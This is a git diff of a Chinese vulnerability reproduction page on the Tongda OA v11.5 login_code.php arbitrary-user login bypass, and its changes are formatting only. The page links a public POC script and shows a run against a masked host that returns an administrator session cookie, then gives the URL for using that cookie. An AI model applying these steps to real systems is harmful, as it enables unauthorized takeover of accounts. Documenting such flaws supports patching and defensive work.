@@ -1,9 +1,8 @@
-# 通达OA v11.5 login_code.php 任意用户登录
+# 通达OA v11.5 login\_code.php 任意用户登录
 
 ## 漏洞描述
 
-通达OA是一套办公系统。2020年04月17日, 通达OA官方在更新了一个v11版本安全补丁, 其中修复了一个任意用户伪造登录漏洞。
-该漏洞类型为任意用户伪造，未经授权的远程攻击者可以通过精心构造的请求包进行任意用户伪造登录。
+通达OA是一套办公系统。2020年04月17日, 通达OA官方在更新了一个v11版本安全补丁, 其中修复了一个任意用户伪造登录漏洞。 该漏洞类型为任意用户伪造，未经授权的远程攻击者可以通过精心构造的请求包进行任意用户伪造登录。
 
 ## 漏洞影响
 
@@ -16,28 +15,26 @@
 
 漏洞环境下载
 
-```plain
+```
 https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe
 ```
 
 双击安装即可
 
-![image-20220209105714403](images/202202091057824.png)
-
-
+![image-20220209105714403](../.gitbook/assets/202202091057824.png)
 
 ## 漏洞复现
 
 使用[POC](https://github.com/NS-Sp4ce/TongDaOA-Fake-User/blob/master/POC.py)获取管理员的Cookie
 
-```plain
+```
 root@kali:~/桌面# python3 1.py -v 11 -u http://xx.xxx.xxx.xxx
 [+]Get Available COOKIE:PHPSESSID=sr3f46qg6539khd3e3rrucoa72; path=/
 ```
 
-成功获得Cookie,添加Cookie访问 [**http://xxx.xxx.xxx.xxx/general/index.php?isIE=0&modify_pwd=0**](http://xxx.xxx.xxx.xxx/general/index.php?isIE=0&modify_pwd=0)即可
+成功获得Cookie,添加Cookie访问 [**http://xxx.xxx.xxx.xxx/general/index.php?isIE=0\&modify\_pwd=0**](http://xxx.xxx.xxx.xxx/general/index.php?isIE=0\&modify_pwd=0)即可
 
-![image-20220209105731535](images/202202091057599.png)
+![image-20220209105731535](../.gitbook/assets/202202091057599.png)
 
 ## 漏洞POC
 
